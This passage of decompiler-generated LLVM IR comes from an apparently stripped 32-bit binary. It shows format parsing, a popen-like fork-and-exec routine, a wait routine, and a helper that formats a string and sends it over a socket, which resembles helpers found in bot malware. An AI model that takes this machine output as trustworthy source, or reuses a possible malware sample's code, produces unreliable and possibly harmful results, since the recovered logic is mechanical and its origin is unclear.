  store i32 %v6_80487a3, i32* %eax.global-to-local, align 4
  %v10_80487a5 = icmp eq i8 %v2_80487a3, 88
  %v1_80487a7 = icmp eq i1 %v10_80487a5, false
  br i1 %v1_80487a7, label %dec_label_pc_80487d9, label %dec_label_pc_80487a9

dec_label_pc_80487a9:                             ; preds = %dec_label_pc_80487a0
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_80487ac = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_80487b4 = inttoptr i32 %stack_var_12.111 to i32*
  %v2_80487b4 = load i32, i32* %v1_80487b4, align 4
  store i32 %v2_80487b4, i32* %eax.global-to-local, align 4
  %v1_80487b9 = add i32 %v0_8048850, -8
  %v2_80487b9 = inttoptr i32 %v1_80487b9 to i32*
  store i32 65, i32* %v2_80487b9, align 4
  %v5_80487bb = add i32 %v0_8048850, -12
  %v6_80487bb = inttoptr i32 %v5_80487bb to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487bb, align 4
  %v5_80487be = add i32 %v0_8048850, -16
  %v6_80487be = inttoptr i32 %v5_80487be to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487be, align 4
  %v1_80487c1 = add i32 %v0_8048850, -20
  %v2_80487c1 = inttoptr i32 %v1_80487c1 to i32*
  store i32 0, i32* %v2_80487c1, align 4
  %v1_80487c3 = add i32 %v0_8048850, -24
  %v2_80487c3 = inttoptr i32 %v1_80487c3 to i32*
  store i32 16, i32* %v2_80487c3, align 4
  %v0_80487c5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80487c5 = add i32 %v0_8048850, -28
  %v3_80487c5 = inttoptr i32 %v2_80487c5 to i32*
  store i32 %v0_80487c5, i32* %v3_80487c5, align 4
  %v5_80487c6 = add i32 %v0_8048850, -32
  %v6_80487c6 = inttoptr i32 %v5_80487c6 to i32*
  store i32 %tmp21, i32* %v6_80487c6, align 4
  %v1_80487c9 = call i32 @function_8048518(i32 %v1_80487ac)
  store i32 %v1_80487c9, i32* %eax.global-to-local, align 4
  %v0_80487ce = load i32, i32* @esp, align 4
  %v1_80487ce = add i32 %v0_80487ce, 32
  %v5_80487d1 = add i32 %v1_80487c9, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_80487d9:                             ; preds = %dec_label_pc_80487a0
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80487dc = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80487dc = zext i8 %v2_80487dc to i32
  %v6_80487dc = or i32 %v3_80487dc, %v5_80486d4.lcssa
  store i32 %v6_80487dc, i32* %eax.global-to-local, align 4
  %v10_80487de = icmp eq i8 %v2_80487dc, 117
  %v1_80487e0 = icmp eq i1 %v10_80487de, false
  br i1 %v1_80487e0, label %dec_label_pc_804880f, label %dec_label_pc_80487e2

dec_label_pc_80487e2:                             ; preds = %dec_label_pc_80487d9
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_80487e5 = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_80487ed = inttoptr i32 %stack_var_12.111 to i32*
  %v2_80487ed = load i32, i32* %v1_80487ed, align 4
  store i32 %v2_80487ed, i32* %eax.global-to-local, align 4
  %v1_80487f2 = add i32 %v0_8048850, -8
  %v2_80487f2 = inttoptr i32 %v1_80487f2 to i32*
  store i32 97, i32* %v2_80487f2, align 4
  %v5_80487f4 = add i32 %v0_8048850, -12
  %v6_80487f4 = inttoptr i32 %v5_80487f4 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80487f4, align 4
  %v5_80487f7 = add i32 %v0_8048850, -16
  %v6_80487f7 = inttoptr i32 %v5_80487f7 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80487f7, align 4
  %v1_80487fa = add i32 %v0_8048850, -20
  %v2_80487fa = inttoptr i32 %v1_80487fa to i32*
  store i32 0, i32* %v2_80487fa, align 4
  %v1_80487fc = add i32 %v0_8048850, -24
  %v2_80487fc = inttoptr i32 %v1_80487fc to i32*
  store i32 10, i32* %v2_80487fc, align 4
  %v0_80487fe = load i32, i32* %eax.global-to-local, align 4
  %v2_80487fe = add i32 %v0_8048850, -28
  %v3_80487fe = inttoptr i32 %v2_80487fe to i32*
  store i32 %v0_80487fe, i32* %v3_80487fe, align 4
  %v5_80487ff = add i32 %v0_8048850, -32
  %v6_80487ff = inttoptr i32 %v5_80487ff to i32*
  store i32 %tmp21, i32* %v6_80487ff, align 4
  %v1_8048802 = call i32 @function_8048518(i32 %v1_80487e5)
  store i32 %v1_8048802, i32* %eax.global-to-local, align 4
  %v0_8048807 = load i32, i32* @esp, align 4
  %v1_8048807 = add i32 %v0_8048807, 32
  %v5_804880a = add i32 %v1_8048802, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_804880f:                             ; preds = %dec_label_pc_80487d9
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048812 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048812 = zext i8 %v2_8048812 to i32
  %v6_8048812 = or i32 %v3_8048812, %v5_80486d4.lcssa
  store i32 %v6_8048812, i32* %eax.global-to-local, align 4
  %v10_8048814 = icmp eq i8 %v2_8048812, 99
  %v1_8048816 = icmp eq i1 %v10_8048814, false
  br i1 %v1_8048816, label %dec_label_pc_8048862, label %dec_label_pc_8048818

dec_label_pc_8048818:                             ; preds = %dec_label_pc_804880f
  store i32 %stack_var_12.111, i32* @edx, align 4
  %v1_804881b = add i32 %stack_var_12.111, 4
  store i32 %stack_var_12.111, i32* %eax.global-to-local, align 4
  %v1_8048823 = inttoptr i32 %stack_var_12.111 to i32*
  %v2_8048823 = load i32, i32* %v1_8048823, align 4
  store i32 %v2_8048823, i32* %stack_var_-6, align 4
  %v5_804882c = add i32 %v0_8048850, -4
  %v6_804882c = inttoptr i32 %v5_804882c to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804882c, align 4
  %v5_804882f = add i32 %v0_8048850, -8
  %v6_804882f = inttoptr i32 %v5_804882f to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804882f, align 4
  store i32 %v2_8048832, i32* %eax.global-to-local, align 4
  %v2_8048835 = add i32 %v0_8048850, -12
  %v3_8048835 = inttoptr i32 %v2_8048835 to i32*
  store i32 %v2_8048832, i32* %v3_8048835, align 4
  %v5_8048836 = add i32 %v0_8048850, -16
  %v6_8048836 = inttoptr i32 %v5_8048836 to i32*
  store i32 %tmp21, i32* %v6_8048836, align 4
  %v0_8048839 = load i32, i32* %stack_var_-6, align 4
  %v6_8048839 = call i32 @function_8048441(i32 %v0_8048839, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048839, i32* %eax.global-to-local, align 4
  %v0_804883e = load i32, i32* @esp, align 4
  %v1_804883e = add i32 %v0_804883e, 16
  %v5_8048841 = add i32 %v6_8048839, %stack_var_-28.113
  br label %dec_label_pc_8048862

dec_label_pc_8048846:                             ; preds = %dec_label_pc_8048679, %dec_label_pc_804864f
  %stack_var_8.2 = phi i8* [ %stack_var_8.414, %dec_label_pc_804864f ], [ %v22_804865c, %dec_label_pc_8048679 ]
  %v4_8048846 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_8048846, i32* %eax.global-to-local, align 4
  %v2_8048849 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048849 = zext i8 %v2_8048849 to i32
  store i32 %v3_8048849, i32* %eax.global-to-local, align 4
  %v2_8048853 = add i32 %v0_8048850, -12
  %v3_8048853 = inttoptr i32 %v2_8048853 to i32*
  store i32 %v3_8048849, i32* %v3_8048853, align 4
  %v5_8048854 = add i32 %v0_8048850, -16
  %v6_8048854 = inttoptr i32 %v5_8048854 to i32*
  store i32 %tmp21, i32* %v6_8048854, align 4
  %v2_8048857 = inttoptr i32 %stack_var_-28.113 to i32*
  %v3_8048857 = call i32 @function_8048407(i32* %v2_8048857, i32 %stack_var_-24.110)
  store i32 %v3_8048857, i32* %eax.global-to-local, align 4
  %v0_804885c = load i32, i32* @esp, align 4
  %v1_804885c = add i32 %v0_804885c, 16
  %v4_804885f = add i32 %stack_var_-28.113, 1
  br label %dec_label_pc_8048862

dec_label_pc_8048862:                             ; preds = %dec_label_pc_804880f, %dec_label_pc_8048818, %dec_label_pc_80487e2, %dec_label_pc_80487a9, %dec_label_pc_8048770, %dec_label_pc_8048737, %dec_label_pc_8048711, %dec_label_pc_8048846
  %v4_804871419 = phi i32 [ %v1_804885c, %dec_label_pc_8048846 ], [ %v0_8048850, %dec_label_pc_804880f ], [ %v1_804883e, %dec_label_pc_8048818 ], [ %v1_8048807, %dec_label_pc_80487e2 ], [ %v1_80487ce, %dec_label_pc_80487a9 ], [ %v1_8048795, %dec_label_pc_8048770 ], [ %v1_804875c, %dec_label_pc_8048737 ], [ %v1_8048723, %dec_label_pc_8048711 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.110, %dec_label_pc_8048846 ], [ %stack_var_-24.110, %dec_label_pc_804880f ], [ %stack_var_-24.110, %dec_label_pc_8048818 ], [ %stack_var_-24.110, %dec_label_pc_80487e2 ], [ %stack_var_-24.110, %dec_label_pc_80487a9 ], [ %stack_var_-24.110, %dec_label_pc_8048770 ], [ %stack_var_-24.110, %dec_label_pc_8048737 ], [ %v2_80486f7, %dec_label_pc_8048711 ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.111, %dec_label_pc_8048846 ], [ %stack_var_12.111, %dec_label_pc_804880f ], [ %v1_804881b, %dec_label_pc_8048818 ], [ %v1_80487e5, %dec_label_pc_80487e2 ], [ %v1_80487ac, %dec_label_pc_80487a9 ], [ %v1_8048773, %dec_label_pc_8048770 ], [ %v1_804873a, %dec_label_pc_8048737 ], [ %v1_80486ef, %dec_label_pc_8048711 ]
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048846 ], [ %stack_var_8.1.lcssa, %dec_label_pc_804880f ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048818 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487e2 ], [ %stack_var_8.1.lcssa, %dec_label_pc_80487a9 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048770 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048737 ], [ %stack_var_8.1.lcssa, %dec_label_pc_8048711 ]
  %stack_var_-28.0 = phi i32 [ %v4_804885f, %dec_label_pc_8048846 ], [ %stack_var_-28.113, %dec_label_pc_804880f ], [ %v5_8048841, %dec_label_pc_8048818 ], [ %v5_804880a, %dec_label_pc_80487e2 ], [ %v5_80487d1, %dec_label_pc_80487a9 ], [ %v5_8048798, %dec_label_pc_8048770 ], [ %v5_804875f, %dec_label_pc_8048737 ], [ %v5_8048726, %dec_label_pc_8048711 ]
  %v4_8048862 = ptrtoint i8* %stack_var_8.3 to i32
  %v5_8048862 = add i32 %v4_8048862, 1
  %stack_var_8.4 = inttoptr i32 %v5_8048862 to i8*
  store i32 %v5_8048862, i32* %eax.global-to-local, align 4
  %v2_8048868 = load i8, i8* %stack_var_8.4, align 1
  %v3_8048868 = zext i8 %v2_8048868 to i32
  %v5_8048868 = and i32 %v5_8048862, -256
  %v6_8048868 = or i32 %v3_8048868, %v5_8048868
  store i32 %v6_8048868, i32* %eax.global-to-local, align 4
  %v4_804886a = icmp eq i8 %v2_8048868, 0
  %v1_804886c = icmp eq i1 %v4_804886a, false
  br i1 %v1_804886c, label %dec_label_pc_804864f, label %dec_label_pc_8048872

dec_label_pc_8048872:                             ; preds = %dec_label_pc_8048862, %dec_label_pc_804865c, %dec_label_pc_804863d
  %stack_var_-28.1.lcssa = phi i32 [ 0, %dec_label_pc_804863d ], [ %stack_var_-28.0, %dec_label_pc_8048862 ], [ %stack_var_-28.113, %dec_label_pc_804865c ]
  %v4_8048872 = icmp eq i32* %arg1, null
  br i1 %v4_8048872, label %dec_label_pc_8048880, label %dec_label_pc_8048878

dec_label_pc_8048878:                             ; preds = %dec_label_pc_8048872
  store i32 %tmp21, i32* %eax.global-to-local, align 4
  %v2_804887b = load i32, i32* %arg1, align 4
  store i32 %v2_804887b, i32* %eax.global-to-local, align 4
  %v1_804887d = inttoptr i32 %v2_804887b to i8*
  store i8 0, i8* %v1_804887d, align 1
  br label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_8048872, %dec_label_pc_8048878
  store i32 %stack_var_-28.1.lcssa, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_8048862, { 2, 1, 0, 3 }
  uselistorder i8* %stack_var_8.2, { 0, 2, 1 }
  uselistorder i32 %v2_80486f7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v5_80486d4.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_80486d1.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %stack_var_8.1.lcssa, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-36.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %stack_var_-32.0.lcssa, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_804869b, { 1, 2, 3, 0 }
  uselistorder i8* %stack_var_8.0.ph, { 2, 1, 0 }
  uselistorder i32 %stack_var_-32.0.ph, { 1, 0 }
  uselistorder i1 %v1_804868d, { 1, 0 }
  uselistorder i8* %v22_804865c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-24.110, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_12.111, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32 %stack_var_8.4.in12, { 2, 1, 0 }
  uselistorder i32 %stack_var_-28.113, { 0, 9, 8, 7, 1, 2, 3, 4, 5, 6, 10 }
  uselistorder i32 %v0_8048850, { 38, 1, 0, 5, 4, 3, 2, 12, 11, 10, 9, 8, 7, 6, 19, 18, 17, 16, 15, 14, 13, 26, 25, 24, 23, 22, 21, 20, 33, 32, 31, 30, 29, 28, 27, 37, 36, 35, 34 }
  uselistorder i32 %v5_80488685, { 1, 0 }
  uselistorder i32 %tmp21, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 8, 51, 52, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 53, 54, 55, 56, 57, 58, 59, 60, 62, 63, 64, 65, 61, 3, 2, 41, 42, 1, 0, 43, 44, 45, 46, 47, 48, 49, 50, 5, 4 }
  uselistorder i32 (i32)* @function_8048518, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32)* @function_8048441, { 0, 3, 1, 2 }
  uselistorder i8 48, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_8048880, { 1, 0 }
  uselistorder label %dec_label_pc_8048862, { 7, 1, 0, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8048711, { 1, 0 }
  uselistorder label %dec_label_pc_80486e3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80486da, { 1, 0 }
  uselistorder label %dec_label_pc_804869b, { 1, 0 }
  uselistorder label %dec_label_pc_804864f, { 1, 0 }
}

define i32 @function_8048885(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8048885:
  %stack_var_8 = alloca i32, align 4
  %v4_804888e = ptrtoint i32* %stack_var_8 to i32
  %v4_804889d = call i32 @function_804863d(i32* null, i32 %arg1, i32 %v4_804888e)
  ret i32 %v4_804889d
}

define i32 @function_80488a7(i32 %arg1) local_unnamed_addr {
dec_label_pc_80488a7:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v4_80488b0 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488c1 = call i32 @function_804863d(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488b0)
  ret i32 %v4_80488c1
}

define i32 @function_80488cb(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_80488cb:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %v1_80488da = call i32 @function_804f8ae(i32 2048)
  store i32 %v1_80488da, i32* %stack_var_-20, align 4
  %v3_80488f6 = inttoptr i32 %v1_80488da to i8*
  %v4_80488f6 = call i32 @function_804f1d8(i8* %v3_80488f6, i32 0, i32 2048)
  %v4_8048907 = ptrtoint i32* %stack_var_12 to i32
  %v4_8048919 = call i32 @function_804863d(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_8048907)
  %v3_8048932 = call i32 @_strlen(i8* %v3_80488f6)
  %v6_8048939 = add i32 %v3_8048932, %v1_80488da
  %v1_804893c = inttoptr i32 %v6_8048939 to i8*
  store i8 10, i8* %v1_804893c, align 1
  store i32 %v1_80488da, i32* @edi, align 4
  %v3_8048950 = call i32 @_strlen(i8* %v3_80488f6)
  %v4_8048963 = call i32 @function_804f64c(i32 %arg1, i32 %v1_80488da, i32 %v3_8048950, i32 16384)
  %v1_8048974 = call i32 @function_8050259(i32 %v1_80488da)
  ret i32 %v4_8048963

; uselistorder directives
  uselistorder i32 %v1_80488da, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_8048984(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_8048984:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %v4_804898b = ptrtoint i8* %arg2 to i32
  %v2_804898e = load i8, i8* %arg2, align 1
  %v10_8048990 = icmp eq i8 %v2_804898e, 114
  br i1 %v10_8048990, label %dec_label_pc_804899d, label %dec_label_pc_8048994

dec_label_pc_8048994:                             ; preds = %dec_label_pc_8048984
  %v2_8048997 = load i8, i8* %arg2, align 1
  %v10_8048999 = icmp eq i8 %v2_8048997, 119
  %v1_804899b = icmp eq i1 %v10_8048999, false
  br i1 %v1_804899b, label %dec_label_pc_8048b72, label %dec_label_pc_804899d

dec_label_pc_804899d:                             ; preds = %dec_label_pc_8048994, %dec_label_pc_8048984
  %v1_80489a0 = add i32 %v4_804898b, 1
  %v1_80489a1 = inttoptr i32 %v1_80489a0 to i8*
  %v2_80489a1 = load i8, i8* %v1_80489a1, align 1
  %v4_80489a3 = icmp eq i8 %v2_80489a1, 0
  br i1 %v4_80489a3, label %dec_label_pc_80489b3, label %dec_label_pc_8048b72

dec_label_pc_80489b3:                             ; preds = %dec_label_pc_804899d
  %v2_80489b6 = ptrtoint i32* %stack_var_-24 to i32
  %v1_80489ba = call i32 @function_804e00c(i32 %v2_80489b6)
  %v2_80489c2 = icmp slt i32 %v1_80489ba, 0
  %v1_80489c4 = icmp eq i1 %v2_80489c2, false
  br i1 %v1_80489c4, label %dec_label_pc_80489d2, label %dec_label_pc_8048b72

dec_label_pc_80489d2:                             ; preds = %dec_label_pc_80489b3
  %v0_80489d2 = load i8*, i8** @global_var_8059440.17, align 4
  %v2_80489d7 = icmp eq i8* %v0_80489d2, null
  %v1_80489d9 = icmp eq i1 %v2_80489d7, false
  br i1 %v1_80489d9, label %bb, label %dec_label_pc_80489db

dec_label_pc_80489db:                             ; preds = %dec_label_pc_80489d2
  %v2_80489db = load i32, i32* %stack_var_-24, align 4
  %v3_80489db = call i32 @function_804deb0(i32 %tmp19, i32 %tmp, i32 %v2_80489db)
  %tmp33 = icmp slt i32 %v3_80489db, 1
  %tmp34 = icmp eq i1 %tmp33, false
  br i1 %tmp34, label %dec_label_pc_80489f5, label %dec_label_pc_8048b72

dec_label_pc_80489f5:                             ; preds = %dec_label_pc_80489db
  %v2_80489f8 = mul i32 %v3_80489db, 4
  %v1_80489ff = call i32 @function_804f8ae(i32 %v2_80489f8)
  %v1_8048a07 = inttoptr i32 %v1_80489ff to i8*
  store i8* %v1_8048a07, i8** @global_var_8059440.17, align 64
  %v2_8048a11 = icmp eq i32 %v1_80489ff, 0
  %v1_8048a13 = icmp eq i1 %v2_8048a11, false
  br i1 %v1_8048a13, label %dec_label_pc_8048a21, label %dec_label_pc_8048b72

dec_label_pc_8048a21:                             ; preds = %dec_label_pc_80489f5
  %v1_8048a24 = mul i32 %v3_80489db, 4
  store i32 %v1_80489ff, i32* @edi, align 4
  %v1_8048a35 = and i32 %v1_80489ff, -256
  %v5_8048a37 = call i8* @_memset(i8* %v1_8048a07, i32 %v1_8048a35, i32 %v1_8048a24)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489d2, %dec_label_pc_8048a21
  %v0_8048a39 = call i32 @function_804dd1c()
  %v13_8048a47 = icmp eq i32 %v0_8048a39, -1
  br i1 %v13_8048a47, label %dec_label_pc_8048a58, label %dec_label_pc_8048a4d

dec_label_pc_8048a4d:                             ; preds = %bb
  %v4_8048a4d = icmp eq i32 %v0_8048a39, 0
  %v2_8048a85 = load i8, i8* %arg2, align 1
  %v10_8048a87 = icmp eq i8 %v2_8048a85, 114
  %v1_8048a89 = icmp eq i1 %v10_8048a87, false
  br i1 %v4_8048a4d, label %dec_label_pc_8048a82, label %dec_label_pc_8048b23

dec_label_pc_8048a58:                             ; preds = %bb
  %v3_8048a58 = load i32, i32* %stack_var_-24, align 4
  %v1_8048a5f = call i32 @function_804de24(i32 %v3_8048a58)
  %v1_8048a6e = call i32 @function_804de24(i32 %tmp15)
  br label %dec_label_pc_8048b72

dec_label_pc_8048a82:                             ; preds = %dec_label_pc_8048a4d
  br i1 %v1_8048a89, label %dec_label_pc_8048ac4, label %dec_label_pc_8048a8b

dec_label_pc_8048a8b:                             ; preds = %dec_label_pc_8048a82
  %v9_8048a8e = icmp eq i32 %tmp15, 1
  br i1 %v9_8048a8e, label %dec_label_pc_8048ab3, label %dec_label_pc_8048a93

dec_label_pc_8048a93:                             ; preds = %dec_label_pc_8048a8b
  %v2_8048a9c = call i32 @function_804de54(i32 %tmp15, i32 1)
  %v1_8048aab = call i32 @function_804de24(i32 %tmp15)
  br label %dec_label_pc_8048ab3

dec_label_pc_8048ab3:                             ; preds = %dec_label_pc_8048a8b, %dec_label_pc_8048a93
  %v3_8048ab3 = load i32, i32* %stack_var_-24, align 4
  %v1_8048aba = call i32 @function_804de24(i32 %v3_8048ab3)
  br label %dec_label_pc_8048afa

dec_label_pc_8048ac4:                             ; preds = %dec_label_pc_8048a82
  %v3_8048ac4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ac7 = icmp eq i32 %v3_8048ac4, 0
  br i1 %v1_8048ac7, label %dec_label_pc_8048aeb, label %dec_label_pc_8048acb

dec_label_pc_8048acb:                             ; preds = %dec_label_pc_8048ac4
  %v2_8048ad4 = call i32 @function_804de54(i32 %v3_8048ac4, i32 0)
  %v3_8048adc = load i32, i32* %stack_var_-24, align 4
  %v1_8048ae3 = call i32 @function_804de24(i32 %v3_8048adc)
  br label %dec_label_pc_8048aeb

dec_label_pc_8048aeb:                             ; preds = %dec_label_pc_8048ac4, %dec_label_pc_8048acb
  %v1_8048af2 = call i32 @function_804de24(i32 %tmp15)
  br label %dec_label_pc_8048afa

dec_label_pc_8048afa:                             ; preds = %dec_label_pc_8048ab3, %dec_label_pc_8048aeb
  %v8_8048b11 = call i32 @function_8050a60(i32 ptrtoint ([8 x i8]* @global_var_805254f.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_805254c.19 to i32), i32 ptrtoint ([3 x i8]* @global_var_8052549.18 to i32), i32 %arg1, i32 0)
  %v1_8048b1e = call i32 @function_804ddcc(i32 127)
  unreachable

dec_label_pc_8048b23:                             ; preds = %dec_label_pc_8048a4d
  br i1 %v1_8048a89, label %dec_label_pc_8048b43, label %dec_label_pc_8048b2c

dec_label_pc_8048b2c:                             ; preds = %dec_label_pc_8048b23
  %v3_8048b2c = load i32, i32* %stack_var_-24, align 4
  %v2_8048b39 = call i32 @function_804de24(i32 %tmp15)
  br label %dec_label_pc_8048b58

dec_label_pc_8048b43:                             ; preds = %dec_label_pc_8048b23
  %v3_8048b49 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b50 = call i32 @function_804de24(i32 %v3_8048b49)
  br label %dec_label_pc_8048b58

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b2c, %dec_label_pc_8048b43
  %stack_var_-28.0 = phi i32 [ %v3_8048b2c, %dec_label_pc_8048b2c ], [ %tmp15, %dec_label_pc_8048b43 ]
  %v2_8048b5b = mul i32 %stack_var_-28.0, 4
  %v0_8048b60 = load i8*, i8** @global_var_8059440.17, align 4
  %v1_8048b60 = ptrtoint i8* %v0_8048b60 to i32
  %v2_8048b65 = add i32 %v1_8048b60, %v2_8048b5b
  %v2_8048b6a = inttoptr i32 %v2_8048b65 to i32*
  store i32 %v0_8048a39, i32* %v2_8048b6a, align 4
  br label %dec_label_pc_8048b72

dec_label_pc_8048b72:                             ; preds = %dec_label_pc_80489f5, %dec_label_pc_80489db, %dec_label_pc_80489b3, %dec_label_pc_8048994, %dec_label_pc_804899d, %dec_label_pc_8048a58, %dec_label_pc_8048b58
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a58 ], [ %stack_var_-28.0, %dec_label_pc_8048b58 ], [ -1, %dec_label_pc_804899d ], [ -1, %dec_label_pc_8048994 ], [ -1, %dec_label_pc_80489b3 ], [ -1, %dec_label_pc_80489db ], [ -1, %dec_label_pc_80489f5 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048a39, { 1, 2, 0 }
  uselistorder i32 %v1_80489ff, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80489db, { 2, 0, 1 }
  uselistorder i32* %stack_var_-24, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i32 %tmp15, { 1, 6, 3, 4, 5, 0, 2 }
  uselistorder i32 (i32, i32)* @function_804de54, { 1, 0 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b72, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b58, { 1, 0 }
  uselistorder label %dec_label_pc_8048afa, { 1, 0 }
  uselistorder label %dec_label_pc_8048aeb, { 1, 0 }
  uselistorder label %dec_label_pc_8048ab3, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_8048b7a(i32 %arg1) local_unnamed_addr {
dec_label_pc_8048b7a:
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %v0_8048b83 = load i8*, i8** @global_var_8059440.17, align 4
  %v2_8048b88 = icmp eq i8* %v0_8048b83, null
  br i1 %v2_8048b88, label %dec_label_pc_8048cd6, label %dec_label_pc_8048b8c

dec_label_pc_8048b8c:                             ; preds = %dec_label_pc_8048b7a
  %v1_8048b83 = ptrtoint i8* %v0_8048b83 to i32
  %v2_8048b8f = mul i32 %arg1, 4
  %v2_8048b99 = add i32 %v1_8048b83, %v2_8048b8f
  %v1_8048b9c = inttoptr i32 %v2_8048b99 to i32*
  %v2_8048b9c = load i32, i32* %v1_8048b9c, align 4
  %v1_8048b9e = icmp eq i32 %v2_8048b9c, 0
  %v1_8048ba0 = icmp eq i1 %v1_8048b9e, false
  br i1 %v1_8048ba0, label %dec_label_pc_8048bb1, label %dec_label_pc_8048cd6

dec_label_pc_8048bb1:                             ; preds = %dec_label_pc_8048b8c
  %v1_8048bb7 = call i32 @function_804de24(i32 %arg1)
  %v2_8048bc2 = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bc9 = call i32 @function_804f758(i32 %v2_8048bc2)
  %v2_8048bdd = call i32 @function_804f72c(i32 %v2_8048bc2, i32 2)
  %v2_8048bf1 = call i32 @function_804f72c(i32 %v2_8048bc2, i32 3)
  %v2_8048c05 = call i32 @function_804f72c(i32 %v2_8048bc2, i32 1)
  %v2_8048c10 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c20 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c20 = call i32 @function_804e0dc(i32 0, %_TYPEDEF_sigset_t* %v3_8048c20, i32 %v2_8048c10)
  %v2_8048c3f = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c28

dec_label_pc_8048c28:                             ; preds = %dec_label_pc_8048c5e, %dec_label_pc_8048bb1
  %v0_8048c30 = load i8*, i8** @global_var_8059440.17, align 4
  %v1_8048c30 = ptrtoint i8* %v0_8048c30 to i32
  %v2_8048c35 = add i32 %v1_8048c30, %v2_8048b8f
  %v1_8048c38 = inttoptr i32 %v2_8048c35 to i32*
  %v2_8048c38 = load i32, i32* %v1_8048c38, align 4
  %v3_8048c47 = call i32 @function_804e164(i32 %v2_8048c38, i32 %v2_8048c3f, i32 0)
  %v13_8048c55 = icmp eq i32 %v3_8048c47, -1
  %v1_8048c5c = icmp eq i1 %v13_8048c55, false
  br i1 %v1_8048c5c, label %dec_label_pc_8048c6a, label %dec_label_pc_8048c5e

